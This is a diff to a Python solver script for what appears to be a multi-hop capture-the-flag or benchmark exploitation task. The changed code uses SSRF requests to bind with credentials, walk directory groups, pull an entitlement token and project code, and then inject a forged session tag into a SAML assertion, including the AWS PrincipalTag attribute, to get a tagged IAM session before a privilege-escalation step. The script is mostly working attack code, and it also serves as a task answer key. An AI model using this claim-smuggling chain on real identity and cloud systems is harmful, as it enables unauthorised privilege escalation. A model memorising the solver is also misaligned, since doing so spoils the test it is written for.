@@ -89,7 +89,7 @@ def solve(base: str, echo=print, state: dict = None) -> str:
     bind = ssrf(f"{DIR}/dir/bind?cred={account}:{pw}")
     if "member_of" not in bind:
         raise SolveError(f"bind failed: {bind}")
-    seen, stack, winning, entitlement = set(), list(bind["member_of"]), None, None
+    seen, stack, winning, entitlement, winning_attrs = set(), list(bind["member_of"]), None, None, {}
     while stack:
         g = stack.pop()
         if g in seen:
@@ -98,15 +98,18 @@ def solve(base: str, echo=print, state: dict = None) -> str:
         info = ssrf(f"{DIR}/dir/groups?name={urllib.parse.quote(g)}")
         if isinstance(info, dict):
             if (info.get("entitlement") or "").startswith("fed:request-role:"):
-                winning, entitlement = g, info["entitlement"]
+                winning, entitlement, winning_attrs = g, info["entitlement"], info.get("attributes", {})
             stack += info.get("member_of", [])
     if not winning:
         raise SolveError("no reachable federation-entitled group found")
     granted_role = entitlement.split(":")[-1]
+    # the deploy-eligibility project code is a directory attribute of the entitled group (discovered here)
+    project_code = next(iter(winning_attrs.values())) if winning_attrs else None
     entresp = ssrf(f"{DIR}/dir/entitlement?p={b64u({'user': account, 'password': pw, 'group': winning})}")
     marker(entresp)
     ent = entresp["entitlement_token"]
-    st.update(winning_group=winning, entitlement_token=ent, granted_role=granted_role)
+    st.update(winning_group=winning, entitlement_token=ent, granted_role=granted_role,
+              project_code=project_code)
 
     # ---- hop 4: federation claim-smuggling -----------------------------------------------------
     a0 = ssrf(f"{IDP}/idp/assert?p={b64u({'entitlement': ent, 'role': granted_role, 'attributes': {}})}")
@@ -128,23 +131,20 @@ def solve(base: str, echo=print, state: dict = None) -> str:
         return None
 
     tag_name, _ = find_condition(desc)
-    # The trust value is not a literal — DERIVE it by combining two independent evidence pieces
-    # (review §3): the hop-3 entitlement token we hold, and the external_id published on the pivot,
-    # via the value_rule. A value-spray cannot guess this 16-hex HMAC.
-    sts = desc["session_tag_source"]
-    tag_value = hmac.new(ent.encode(), sts["external_id"].encode(), hashlib.sha256).hexdigest()[:16]
-    # smuggle by the discovered federation family: a nested attribute, or the role scope suffix.
-    if fed_family == "scoped-role":
-        smug = {"entitlement": ent, "role": f"{granted_role};{tag_name}={tag_value}", "attributes": {}}
-        claim_ns = None
-    else:  # nested-attr
-        claim_ns = desc["session_tag_source"]["claim"].split(".", 1)[1]
-        smug = {"entitlement": ent, "role": granted_role, "attributes": {claim_ns: {tag_name: tag_value}}}
+    # The trust value is the project code discovered in the directory (two independent evidence pieces:
+    # the IAM condition names the tag; the directory publishes the code). Inject it via the family's
+    # real attribute-injection vector (the IdP passes caller attributes through unsanitized).
+    tag_value = project_code
+    if fed_family == "delimited-claim":
+        attrs = {"https://idp.corp.internal/claims/session-tags": f"{tag_name}={tag_value}"}
+    else:  # principal-tag — the real AWS SAML PrincipalTag attribute
+        attrs = {f"https://aws.amazon.com/SAML/Attributes/PrincipalTag:{tag_name}": tag_value}
+    smug = {"entitlement": ent, "role": granted_role, "attributes": attrs}
     a1 = ssrf(f"{IDP}/idp/assert?p={b64u(smug)}")
     sess1_resp = ssrf(f"{IAM}/iam/session?assertion={a1['assertion']}")
     marker(sess1_resp)  # h4 — credited ONLY here, when the smuggled tag actually lands on the session
     sess1 = sess1_resp["session"]
-    st.update(claim_ns=claim_ns, tag_name=tag_name, tag_value=tag_value, family=family,
+    st.update(tag_name=tag_name, tag_value=tag_value, family=family,
               fed_family=fed_family, bootstrap_session=sess0, tagged_session=sess1)
 
     # ---- hop 5: cloud IAM privesc — mechanism depends on the discovered family -----------------
